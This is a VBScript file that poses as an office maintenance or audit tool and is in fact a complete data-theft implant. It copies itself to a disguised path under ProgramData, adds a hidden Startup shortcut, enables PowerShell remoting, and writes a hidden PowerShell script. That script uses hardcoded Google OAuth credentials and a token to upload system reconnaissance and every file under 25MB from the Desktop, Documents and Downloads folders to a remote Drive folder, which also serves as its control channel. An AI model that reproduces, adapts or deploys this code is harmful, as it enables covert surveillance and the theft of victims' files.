Option Explicit

Dim objFSO, objShell, strPSPath, objFile, appDataPath, startupPath, strWorkerName
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Define where the script will "live" permanently
strPermanentPath = "C:\ProgramData\win_maint_svc.vbs"
strStartupLnk = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' 1. Copy itself to a hidden system folder
If Not objFSO.FileExists(strPermanentPath) Then
    objFSO.CopyFile WScript.ScriptFullName, strPermanentPath, True
End If

' 2. Create the Startup Shortcut if it doesn't exist
If Not objFSO.FileExists(strStartupLnk) Then
    Set objShortcut = objShell.CreateShortcut(strStartupLnk)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & strPermanentPath & """"
    objShortcut.WindowStyle = 0 ' Hidden window
    objShortcut.Save
End If

' 1. Config
strWorkerName = "office_maint_v19.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' 2. Persistence & Remote Connection Setup
On Error Resume Next
' Unblock itself and Enable PowerShell Remoting (WinRM) for your Main System
objShell.Run "powershell.exe -Command ""Unblock-File -Path '" & WScript.ScriptFullName & "'""", 0, True
objShell.Run "powershell.exe -Command ""Enable-PSRemoting -Force""", 0, True
objShell.Run "powershell.exe -Command ""Set-Item WSMan:\localhost\Client\TrustedHosts -Value '100.*' -Force""", 0, True

' Copy to ProgramData and Set Startup
If Not objFSO.FileExists(appDataPath) Then objFSO.CopyFile WScript.ScriptFullName, appDataPath, True
If Not objFSO.FileExists(startupPath) Then
    With objShell.CreateShortcut(startupPath)
        .TargetPath = "wscript.exe": .Arguments = """" & appDataPath & """": .WindowStyle = 0: .Save
    End With
End If
On Error GoTo 0

' 3. Write PowerShell Logic
Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '677717926428-smega8knnqbrrvo6j4ctvllque8jmc2a.apps.googleusercontent.com'"
objFile.WriteLine "$SEC = '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'"
objFile.WriteLine "$TOK = '1//04ovknb57Ph3DCgYIARAAGAQSNwF-L9IrkTy0E_E3b8AIEQ-_jTTy3-o2BDaXitQhY95eLbtN6RM85rDIaOAqckKBZHntlbT09Io'"
objFile.WriteLine "$BaseID = '1YVAYlF68yQfbD5nyuEUqb1AesoLVV5Ff'"

' Auth Handshake
objFile.WriteLine "try { $a=Invoke-RestMethod -Uri 'https://accounts.google.com/o/oauth2/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h=@{Authorization=""Bearer $($a.access_token)""} } catch { exit }"

' STOP Logic (Remote Control via Google Drive)
objFile.WriteLine "$q = [Uri]::EscapeDataString(""'$BaseID' in parents and trashed = false"")"
objFile.WriteLine "try { $df = (Invoke-RestMethod -Uri ""https://www.googleapis.com/drive/v3/files?q=$q&fields=files(name)"" -Headers $h).files.name"
objFile.WriteLine "$Pause = $false; foreach ($f in $df) { if ($f -ilike '*STOP*' -and ($f -ieq 'STOP' -or $f -ilike ""*STOP-$($env:COMPUTERNAME)*"")) { $Pause = $true } } } catch { $Pause = $false }"

' Session Folder Creation
objFile.WriteLine "$meta = @{name=""$($env:COMPUTERNAME)-Audit-$(Get-Date -f 'MMdd-HHmm')"";mimeType='application/vnd.google-apps.folder';parents=@($BaseID)}|ConvertTo-Json"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body $meta -ContentType 'application/json').id"

' Upload Function
objFile.WriteLine "function Up($n, $path, $t) { try { $b=[System.IO.File]::ReadAllBytes($path); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' --- FULL DEEP REPORT ENGINE ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "$R.AppendLine('====================================================')"
objFile.WriteLine "$R.AppendLine("" DEEP OFFICE AUDIT: $($env:COMPUTERNAME) "")"
objFile.WriteLine "$R.AppendLine("" TIME: $(Get-Date) "")"
objFile.WriteLine "$R.AppendLine('====================================================`n')"
objFile.WriteLine "$R.AppendLine('[1. USER PROFILES]'); $R.AppendLine(""Profiles found: $((Get-ChildItem 'C:\Users' | Select Name) -join ', ')""); $R.AppendLine()"
objFile.WriteLine "$R.AppendLine('[2. NETWORK DETAILS]'); Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "Get-NetAdapter | Select Name, Status, MacAddress | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "$R.AppendLine('[3. STORAGE DETAILS]'); Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{N='Total_GB';E={[math]::Round($_.Size/1GB,2)}}, @{N='Free_GB';E={[math]::Round($_.FreeSpace/1GB,2)}} | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "$R.AppendLine('[4. HARDWARE INVENTORY]'); Get-PnpDevice | Where-Object {$_.Status -eq 'OK'} | Select Class, FriendlyName, Manufacturer | Out-String | %{$R.AppendLine($_)}"

objFile.WriteLine "$rt=""$env:TEMP\DeepReport.txt""; $R.ToString() | Out-File $rt; Up 'Deep_Report.txt' $rt $SID; rm $rt"

' --- DATA UPLOAD ---
objFile.WriteLine "if (-not $Pause) {"
objFile.WriteLine "  $reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'"
objFile.WriteLine "  $pts = @((gp $reg).Desktop, (gp $reg).Personal, (gp $reg).'{374DE290-123F-4565-9164-39C4925E467B}')"
objFile.WriteLine "  foreach($p in ($pts | select -Unique)){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 25MB} | %{ Up $_.Name $_.FullName $SID } } }"
objFile.WriteLine "} else { Up 'STOPPED.txt' ([text.encoding]::UTF8.GetBytes('Upload Paused.')) $SID }"
objFile.Close

' 4. Final Execution (Silent)

objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, True

